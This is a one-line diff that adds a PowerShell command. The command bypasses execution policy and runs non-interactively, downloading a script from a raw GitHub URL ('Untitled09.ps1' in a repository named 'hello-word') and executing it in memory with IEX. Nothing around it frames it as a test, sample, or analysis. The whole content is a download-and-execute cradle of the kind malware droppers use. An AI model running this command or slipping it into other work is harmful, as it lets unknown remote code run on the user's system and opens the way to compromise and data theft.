@@ -1,0 +1,1 @@
+C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -noexit IEX ((New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/black-dragoney/hello-word/master/Untitled09.ps1'))"
